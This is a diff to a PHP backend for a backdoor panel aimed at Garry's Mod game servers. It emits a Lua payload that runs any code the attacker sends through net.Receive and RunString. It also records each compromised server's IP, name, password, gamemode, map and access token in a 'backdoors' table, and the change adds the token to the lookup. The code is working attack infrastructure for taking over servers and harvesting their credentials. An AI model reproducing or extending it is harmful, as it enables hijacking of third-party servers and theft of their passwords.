@@ -28,14 +28,14 @@ $lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunStri
 echo $lua; // echo the backdoor script
 
 if($type == "private") {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type]);
+    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type, 'token' => $token]);
     
     // if the servers not found then create the log else if the servers found then update the log
     if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["type" => $type, "server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
     else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
 }
 elseif($type == "public") {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type]);
+    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'type' => $type, 'token' => $token]);
     
     // if the servers not found then create the log else if the servers found then update the log
     if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["type" => $type, "server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
